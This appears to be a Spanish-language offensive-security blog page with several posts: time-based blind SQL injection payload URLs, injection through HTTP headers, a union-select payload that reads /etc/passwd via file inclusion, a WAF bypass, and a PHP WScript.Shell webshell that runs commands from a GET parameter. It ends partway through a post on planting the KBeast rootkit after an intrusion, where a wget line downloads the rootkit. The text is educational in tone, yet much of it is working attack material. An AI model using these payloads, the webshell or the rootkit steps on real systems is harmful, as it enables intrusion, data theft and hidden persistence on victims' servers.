@@ -1,0 +1,426 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by [Q]3rV[0]Mientras "auditaba" una web, lo digo entre comillas por que no me dedico a eso en lo laboral, me encontré con una intrépida variante de &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/posts/11/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/blind-mysqli-time-based-teoria/">Blind Mysqli Time Based [Teoria]</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T17:52:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:52 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.trendgibbons.net/wp-content/uploads/2014/09/Screen-Shot-2014-09-03-at-10.06.17-PM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.trendgibbons.net/wp-content/uploads/2014/09/Screen-Shot-2014-09-03-at-10.06.17-PM.png" height="290" width="400" /></a></div><br /><b>by [Q]3rV[0]</b></div><br />Mientras "auditaba" una web, lo digo entre comillas por que no me dedico a eso en lo laboral, me encontré con una intrépida variante de SQL Injection descartando las demás posibilidades a través de las respuestas que generaba el servidor, note que se trataba de una:<br /><br /><div style="text-align: center;"><b>"Blind Sqli basada en tiempo"</b> </div><br />Paso a explicar a quienes no se encuentren familiarizados con este tipo de inyección.<br /><br />Basicamente una "Blind mysqli basada en tiempo" se trata de inyectar a ciegas como toda blind, en mi caso utilizando la técnica de busqueda binaria (la mas comunmente utilizada en estas situaciones) pero se da cuando la aplicación muestra el mismo mensaje TRUE OR FALSE, es decir que da los mismo inyectar<br />un: <br /><br />OR 1=1 que un OR 2+5/87=9999999999 <br /><br />el sitio web nos seguira mostrando el mismo mensaje de error, o puede deberse a realizar una carga incorrecta del contenido web, o cualquier otra variación en el sitio, da lo mismo, la aplicación resulta vulnerable pero no podremos deducir cual es la inyección correcta.<br /><br />Para estas situaciones, podemos hacer uso de la función sleep() y la estructura condicional if(), ahora paso a explicar la sintaxis de cada una de estas.<br /><br />La sintaxis de if es la siguiente:<br /><br />if(&lt;condicion&gt;,&lt;si la condicion se cumple&gt;,&lt;si la condicion no se cumple&gt;)<br /><br />Por ejemplo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-Xrh8RaTOm5Y/VLXJ3wLC9SI/AAAAAAAAAJQ/HaQT2Wl2iAA/s1600/sleep.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-Xrh8RaTOm5Y/VLXJ3wLC9SI/AAAAAAAAAJQ/HaQT2Wl2iAA/s1600/sleep.png" height="147" width="640" /></a></div><br />sleep() se utiliza para producir una pausa de tantos segundos, vamos a combinarlo con if() e imponerlo si la condicion no se cumple.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-m_XgCZEZxCc/VLXKFFBq2rI/AAAAAAAAAJY/hu71cABVUWU/s1600/sleep2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-m_XgCZEZxCc/VLXKFFBq2rI/AAAAAAAAAJY/hu71cABVUWU/s1600/sleep2.png" height="156" width="640" /></a></div><br />Como vemos la condición dio como resultado falsa y se le introdujo un retardo de 3 seg ante dicha respuesta.<br /><br />ahora se pueden imaginar el resultado del vector al combinar ambas funciones con una blind sqli??<br /><br />No se trata de nada rebuscado, solo hay que utilizar como condición el vector sqli para dicha inyección por ejemplo:<br /><br />Empecemos desde cero, supongamos que encontraron una web vulnerable que da con el perfil de este tipo de inyección y queremos verificar que en realidad se trata de esta, comenzariamos por introcir el siguiente vector en el parametro devil.<br /><br /><pre class="brush: sql">http://vuln-bsqli-based-time/?devil=5 or 1=if(1=1,sleep(5),0)--&nbsp;&nbsp; &gt; 5 segundos(TRUE)<br />http://vuln-bsqli-based-time/?devil=5 or 1=if(1=9999,sleep(5),0)--&nbsp; &gt; FALSE</pre><br />Ahora ya nos damos una idea de como inyectar en la aplicacion comenzando por obtener el listado de las tablas en la base de datos, normalmente en una blind sqli seria de la siguiente manera:<br /><br /><pre class="brush: sql">http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;15-- TRUEhttp://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;50-- TRUE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;100-- FALSE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;68-- FALSE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67-- TRUE</pre><br />Veamos como queda armado el vector haciendo uso de nuestro amigo "el tiempo":<br /><br /><br /><pre class="brush: sql">http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;15,sleep(5),0)-- TRUE 5 segundos<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;50,sleep(5),0)-- TRUE 5 segundos<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;100,sleep(5),0)-- FALSE<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;68,sleep(5),0)-- FALSE<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67,sleep(5),0)-- TRUE 5 segundos<br /></pre>Sencillo, lo unico que tiene de rebuscado esta tecnica es mantener la paciencia mientras se lleva a cabo la inyección manualmente.<br /><br /><div style="text-align: right;">Saludos!</div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/sql-inyection-traves-de-cabeceras-http/">SQL Inyection a Traves De Cabeceras HTTP</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T17:22:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:22 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-R33vwfFZ0pM/VLW4lIdxZ8I/AAAAAAAAAIw/TWitMpirJr8/s1600/inne007.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-R33vwfFZ0pM/VLW4lIdxZ8I/AAAAAAAAAIw/TWitMpirJr8/s1600/inne007.jpg" height="480" width="640" /></a></div><br /><div style="text-align: right;"><b>by [Q]3rv[0</b>]</div><div class="separator" style="clear: both; text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio1.png?d9c344" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><br /></a></div>Cuando realizamos pruebas de variables en una aplicacion web en busca de vulnerabilidades del tipo SQLI o Blind SQLI nos limitamos a testearla solo mediante peticiones GET y POST pero nos olvidamos o desconocemos de otros parametros que pueden ser inyectados para obtener un lindo error de la DB que nos permita meterle jeringa hasta sacarle jugo a&nbsp; toda la información posible.<br /><br />¿Y los parametros de una cabecera HTTP? ¿no son inyectables?<br /><br /><div style="text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio1.png?d9c344" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio1.png?d9c344" height="372" width="640" /></a></div><br />Este es un analisis que se realizo usando varios scaneres de aplicaciones web de codigo abierto y comerciales, como se puede distinguir, el 75%&nbsp; de estas herramientas no pudo encontrar una vulnerabilidad en los encabezados HTTP, por otro lado el 70% de estos scaneres no inspecciona las cookies. Generalmente y si no me queda mas que indagar en las cabeceras trato de buscar este tipo de vulns a mano limpia, como deberia hacerse con todo :)<br /><b><br />Posibles encabezados HTTP para inyecciones SQL</b><br /><b>Los campos de la cabecera HTTP</b> <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-7zRYaP7jbWk/VLXAsmTeIyI/AAAAAAAAAJA/1U-6BI9hqP4/s1600/http.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-7zRYaP7jbWk/VLXAsmTeIyI/AAAAAAAAAJA/1U-6BI9hqP4/s1600/http.png" height="222" width="400" /></a></div><br /><b>X-Forwarded-For</b><br /><br />X-Forwarded-For es un campo de encabezado HTTP para la identificación de la dirección IP de origen de un cliente que se conecta a un servidor web a través de un proxy HTTP o un equilibrador de carga.<br /><br />Vamos a ver un ejemplo de esta falla<br /><br /><pre class="brush: php">$req = mysql_query("SELECT user,password FROM admins WHERE <br />user='".sanitize($_POST['user'])."' AND password='".md5($_POST['password'])."' AND ip_adr='".ip_adr()."'");</pre><br />La variable login es controlada por la funcion sanitize()<br /><br /><pre class="brush: php">function sanitize($param){ if (is_numeric($param)) { return $param; } else { return mysql_real_escape_string($param); } } <br /><br /></pre><br />Vamos a inspeccionar la variable ip controlada por la funcion ip_addr()<br /><br /><pre class="brush: php">function ip_adr() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { <br />$ip_adr = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip_adr = <br />$_SERVER["REMOTE_ADDR"]; } if <br />(preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#",$ip_addr))<br />{ return $ip_adr; } else { return $_SERVER["REMOTE_ADDR"]; } </pre><br />Obviamente, la dirección IP se obtiene del parametro X_FORWARDED_FOR. Luego es controlado por preg_match que verifica si el valor corresponde a una dirección IP<br /><br />la variable HTTP_X_FORWARDED_FOR&nbsp; no es verificada apropiadamente antes de su valor que se utiliza en la consulta SQL. Esto puede llevar a ejecutar cualquier consulta SQL mediante la inyección de código SQL arbitrario en este campo.<br /><br />La simple modificación de este campo de encabezado a algo así como :}<br /><br /><pre class="brush: bash">GET /index.php HTTP/1.1<br />X_FORWARDED_FOR :127.0.0.1' or 1=1#</pre><pre class="brush: bash">&nbsp;</pre><b>User-Agent:&nbsp;</b><br /><br />Tambien podemos hacer uso de este parametro para verificar<br /><br /><pre class="brush: bash">GET /index.php HTTP/1.1<br />User-Agent: aaa' or 1/*<br /></pre>Referer: <br /><pre class="brush: bash">GET /index.php HTTP/1.1<br />Host: [host]<br />User-Agent: aaa' or 1/*<br />Referer: http://underterminal.nixiweb.com [/code]<br /><br /></pre><b>Cookie</b><br /><br />Podemos testear el parametro cookie manualmente complementando algun addon en el navegador que nos permita hacer esto, como Cookies Manager+ o el Tamper Data, asi inyectamos una sqli en el campo content.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio3.png" height="361" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio4.png" height="418" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio5.png" height="308" width="640" /></a></div><br />O usando alguna herramienta de automatizacion como Sqlmap<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio10.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://resources.infosecinstitute.com/wp-content/uploads/033012_1704_SQLInjectio10.png" height="380" width="640" /></a></div><br /><div style="text-align: right;">Espero que les haya servido! saludos!</div><br /></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/lfisqli-incluyendo-ficheros-travez-de/">LFI+SQLI [Incluyendo Ficheros en Valores Enteros]</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T15:12:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:12 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-NHEYKpX84DA/VLWmWHw8LaI/AAAAAAAAAIg/MKrrCswAjPs/s1600/entero-anaranjado-1321868735_21.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-NHEYKpX84DA/VLWmWHw8LaI/AAAAAAAAAIg/MKrrCswAjPs/s1600/entero-anaranjado-1321868735_21.jpg" height="480" width="640" /></a></div><br />No es necesario que un parametro trabaje con valores tipo “string” para incluir ficheros localmente, hay ciertos parametros que trabajan con funciones como include(), require(), etc pero lo hacen por medio de un valor entero,por ejemplo<br /><br />Tenemos la siguiente url:  <a href="http://www.webvuln.com/path/index.php?op=11">http://www.webvuln.com/path/index.php?op=11</a><br /><br />&nbsp;La cual se encarga de mostrar cierto contenido dependiendo del valor que sea ingresado en el “id”.En este caso el script realiza una sentencia en la base de datos para obtener el nombre del fichero, el cual luego sera pasado a include().<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ $query=mysqli_query($conexion, "SELECT path FROM archivos WHERE id=".$_GET['id'].";"); $fichero=mysqli_fetch_array($query, MYSQLI_ASSOC); include($fichero['path']); ]]></script> Ahora vamos a un caso real.  La vulnerabilidad se da del lado del admin, al ingresar una comilla simple vemos el siguiente error.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/tKimFbT.png?2" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/tKimFbT.png?2" /></a></div><br />El problema es que no podemos realizar un path traversal directamente por lo que se explicaba en lineas anteriores, pero si podriamos comprobar si el mismo parametro es vulnerable a inyeccion de comandos SQL.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/PnFMDtY.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/PnFMDtY.png?1" /></a></div><br />Definitivamente si, y nos arroja la columna 3 la cual hace referencia a la seleccion de la ruta del archivo.  Entonces podriamos probar a inyecctar una sentencia para poder divisar cualquier fichero (siempre dentro de los limites) a nuestro antojo.  Veamos el fichero /etc/passwd.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ http://www.webvuln.com/path/index.php?op=11 union select 1,2,0x2f6574632f706173737764,4,5-- ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/UCnFB83.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/UCnFB83.png?1" /></a></div><br />Como dije anteriormente este parametro vulnerable se encuentra detras del panel de administracion, pero hay muchas veces en las que la reglas de un upload no pueden ser evadidas y hay que buscar otra manera de subir una shell, tranquilamente se podria explotar mediante una jpg file inclusion y proseguir con la intrusion.</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/sqlimodsecurity-bypass/">SQLI+Mod_Security Bypass</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T13:15:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-hTOPMUQ_7rs/VLWK8rglDuI/AAAAAAAAAIQ/A397K8bcQOY/s1600/shutterstock_130365146-680x400.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-hTOPMUQ_7rs/VLWK8rglDuI/AAAAAAAAAIQ/A397K8bcQOY/s1600/shutterstock_130365146-680x400.jpg" height="376" width="640" /></a></div><br />Indagando en busca de vulnerabilidades, me cruzo con un input mal  validado el cual esta siendo filtrado por un WAF, posiblemente  Mod_security, bastante mal configurado, en el video se puede ver como  realize una simple evacion de este a travez de <b>/*<i>!</i>*/</b> y funciones como <b>unhex()</b>, <b>hex()</b> espero que lo disfruten!<br /><br /><center><iframe src="//player.vimeo.com/video/55140992" width="800" height="500" frameborder="0"></iframe> <p><a href="http://vimeo.com/55140992">Mod_Security-BYPASS</a> from <a href="http://vimeo.com/user15142856">[Q]3rV[0]</a> on <a href="https://vimeo.com">Vimeo</a>.</p></center></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/tecnicas-de-blind-mysql-injection/">Tecnicas De Blind Mysql Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T12:43:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-d9yRLAApV08/VLWDJIkOtWI/AAAAAAAAAIA/paFjbebIXi4/s1600/eyeinjection-218025.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-d9yRLAApV08/VLWDJIkOtWI/AAAAAAAAAIA/paFjbebIXi4/s1600/eyeinjection-218025.jpeg" height="400" width="640" /></a></div><br /><br />Hola como estan todos!? este es un nuevo pdf en el que pretendo  desarrollar de manera sencilla y entendible dos tecnicas de inyeccion a  ciegas en el gestor de base de datos Mysql, por un lado me gustaria comenzar a hacer  un corto repaso de la tecnica “binary search” que es comunmente las mas  usada y conocida para realizar este tipo de ataques, despues pasar a lo  que es el metodo “Bit Shifting” y por ultimo culminar con otro metodo  que hace uso de la funcion FIND_IN_SET().<br />&nbsp; <br />Disfruten el documento :)<br /><br /><center><iframe allowfullscreen="" frameborder="0" height="510" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/13796822" style="border-width: 1px; border: 1px solid #CCC; margin-bottom: 5px; max-width: 100%;" width="477"> </iframe> <div style="margin-bottom: 5px;"><b> <a href="https://www.slideshare.net/q3rv0/tecnicas-de-blindmysqlinjection-13796822" target="_blank" title="Tecnicas de Blind-Mysql-Injection">Tecnicas de Blind-Mysql-Injection</a> </b> from <b><a href="https://www.slideshare.net/q3rv0" target="_blank">q3rv0</a></b> </div></center></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/windows-os-evadiendo-las/">[Windows OS] Evadiendo Disable_functions COM()</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:48:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:48 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-2F2AhW-Ued0/VLV2vRtCpTI/AAAAAAAAAHw/pB0-vwRpTJs/s1600/disable-php-execution.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-2F2AhW-Ued0/VLV2vRtCpTI/AAAAAAAAAHw/pB0-vwRpTJs/s640/disable-php-execution.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br />Escribo este mini post, para hablar sobre el tema de evacion de  ejecucion de comandos en servidores Windows, es que hace poquito subi  una webshell a un Windows NT, y me encontre con las siguientes funciones  denegadas:<br /><br /><ul><li>system&nbsp;</li><li>shell&nbsp;</li><li>exec&nbsp;</li><li>system_exec&nbsp;</li><li>shell_exec&nbsp;</li><li>mysql_pconnect&nbsp;</li><li>passthru&nbsp;</li><li>popen&nbsp;</li><li>proc_open&nbsp;</li><li>proc_close&nbsp;</li><li>proc_nice&nbsp;</li><li>proc_terminate&nbsp;</li><li>proc_get_status&nbsp;</li><li>escapeshellarg&nbsp;</li><li>escapeshellcmd&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/o0CK2.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/o0CK2.png?1" height="110" width="640" /></a></div><br /><br />Ademas recorde que el usuario Abnormality tenia el mismo problema asi  que por que no aclararlas en este escrito, ademas de hablar un poco  sobre las maneras que pueden haber para saltearnos esta restriccion que  el administrador impuso dentro del php.ini, en mi caso me tope con un  server que corre dos tecnologias web como lo son PHP y ASP, otras cosas a  tener en cuenta pegandole una ojeada a la imagen son las siguientes:<br /><br /><ul><li>Base de datos MSSQL corriendo en local.</li><li>Lenguaje Perl activo</li><li> ASP</li></ul><br />De ahora en mas ya tenemos dos maneras posibles de ejecutar comandos  en el servidor, una es utlizando alguna webshell en perl, como por  ejemplo la tan conocida “CGI telnet”, pero ademas de incluir un  .htaccess que nos agregue la extencion .pl dentro del modulo del  servidor, vamos a tener que modificar la ruta #!/usr/bin/perl por el  path en el que se encuentra instalado perl, por defecto esta es  #!C:\Program Files\perl\perl.exe pero podria estar instalado en otra ubicacion, para eso podriamos buscar la existencia de algun  perlinfo.cgi el cual es un fichero que guarda informacion de perl  similar a info.php, hay podriamos buscar el path del mismo.<br /><br />Otra manera seria ingresando a la base de datos MSSQL con  privilegios de SA y ejecutar comandos mediante la funcion XP_CMDSHELL,  esto lo podriamos hacer indagando en los scripts *.asp (formularios de  autentificacion) de los demas dominios que conviven en el servidor, ya  que no se me impedia moverme libremente por el mismo y leer ficheros  dentro de lo que son los directorios web. Obviamente se debe a una mala  configuracion de los permisos.<br /><br />Tambien podemos subir un shell en ASP.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/HGnsZ.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/HGnsZ.png?1" height="244" width="640" /></a></div><br /><br />Y por ultimo llegamos al uso de COM en php.<br /><br />Basicamente y sin dar muchas vueltas COM permite interactuar con las  aplicaciones de windows,  fue desarrlollado para trabjar con POO  (programacion orientada a objetos) y esta compuesto por objetos como  WScript.Shell el cual permite interactuar con programas como el regedit,  acceso a los directorios del sistema, entre otras tareas.<br /><br />De esta manera investigando a pleno me encuentro con el siguiente script programado por hadi-kiamarsi en php:<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php  error_reporting(E_ALL);  if (isset($_GET['hk']) and !empty($_GET['hk'])) {     $nuevo=new COM('WScript.Shell') or die('Unable to Load Activex'); //se crea el objeto WScript.Shell     $salida=$nuevo->exec($_GET['hk']); //variable de entrada para ejecucion de comandos a travez de WScript mediante exec()     echo "<pre>";<br />    echo $salida->stdout->readall; // obtencion de datos mediante stdout->readall<br />    echo "</pre>"; } ?>]]></script> El cual me premitio cumplir con mi objetivo en el servidor, lo comente un poco para que se entienda aunque es bastante sencillo e intuitivo.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/csTNy.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/csTNy.png?1" /></a></div><br />Saludos y espero que hayan aprendido algo nuevo, por mi parte me alegro de cada dia aparezcan nuevos desafios para seguir dandole para adelante con el conocimiento y la curiosidad!</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/kbeast-plantando-un-rootkit/">[KBEAST] Plantando Un Rootkit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:25:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:25 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-WCfelBHKlks/VLVw6g-uuzI/AAAAAAAAAHg/ILNAs-uNwHk/s1600/5342ec9a23570dcd0a000043-full-rootkit.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-WCfelBHKlks/VLVw6g-uuzI/AAAAAAAAAHg/ILNAs-uNwHk/s640/5342ec9a23570dcd0a000043-full-rootkit.jpg" /></a></div><br />Siempre es conveniente asegurarse el silencio luego de una intrusión, y con que me refiero al silencio? Ademas de entrar en el tema de borrado de huellas, me refiero a la accion de dejar un secuas en el servidor que se encargue de ocultar ciertos procesos, archivos, etc que dejemos en el target para esto voy a utilizar a KBeast que es un rootkit 2011, ademas de uno de mis preferidos, tiene soporte para los kernel 2.6.18 y 2.6.32,y presenta varias funcionalidades interesantes como:<br /><br /><ul><li>Ocultar archivos y directorios&nbsp;</li><li>Ocultar procesos de (ps, pstree, top, lsof)&nbsp;</li><li>Ocultar puertos locales abiertos (backdoors)&nbsp;</li><li>Viene con un modulo keylogger incorporado para capturar las pulsaciones.&nbsp;</li><li>Anti-kill para procesos&nbsp;</li><li>Anti-remove para archivos&nbsp;</li><li>Trae un backdoor bind incorporado&nbsp;</li><li>Tambien se encarga de esconder ciertos modulos cargando en el kernel ademas de un anti-remove para estos.&nbsp; </li></ul>Bastante completita la basura!, demas esta decir que requerimos de privilegios de usuario root, en este caso lo voy a realizar en un debian con un kernel 2.6.32 (entorno controlado)  Descargamos el rootkit.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ wget http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz  ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GZ4hh.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" 